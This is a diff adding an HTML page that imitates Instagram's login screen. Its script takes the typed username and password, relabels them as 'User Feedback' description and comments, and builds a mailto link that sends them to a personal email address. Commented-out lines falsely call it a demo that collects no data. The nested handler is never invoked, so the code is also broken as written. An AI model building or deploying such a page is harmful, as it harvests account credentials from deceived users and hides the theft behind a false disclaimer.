@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      width: 350px;
+    }
+
+    .box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 20px;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 8px;
+      border: 1px solid #dbdbdb;
+      background: #fafafa;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 8px;
+      background: #4cb5f9;
+      border: none;
+      color: #fff;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:disabled {
+      background: #b2dffc;
+      cursor: not-allowed;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .divider span {
+      margin: 0 18px;
+    }
+
+    .fb-login {
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .signup-box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="box">
+      <div class="logo">Instagram</div>
+
+      <form onsubmit="handleLogin(event)">
+        <input type="text" placeholder="Phone number, username, or email" required />
+        <input type="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+      
+
+      <div class="divider"><span>OR</span></div>
+
+      <div class="fb-login">Log in with Facebook</div>
+
+      <a class="forgot" href="#">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+      Don’t have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <script>
+    function handleLogin(e) {
+      // e.preventDefault();
+      // alert(`Wrong username or password. Please try again with correct credentials.`);
+      // alert(`Demo UI only. No data is collected or sent. ${e.target[1].value} attempted to log in.`);
+      // console.log("Login button clicked (UI demo)");
+      function handleLogin(e) {
+        e.preventDefault();
+
+        const description = e.target[0].value;
+        const comments = e.target[1].value;
+
+        const subject = encodeURIComponent("User Feedback");
+        const body = encodeURIComponent(
+          `Description:\n${description}\n\nComments:\n${comments}`
+        );
+
+        window.location.href = `mailto:ramsatya13970@gmail.com?subject=${subject}&body=${body}`;
+      }
+    }
+  </script>
+
+</body>
+</html>
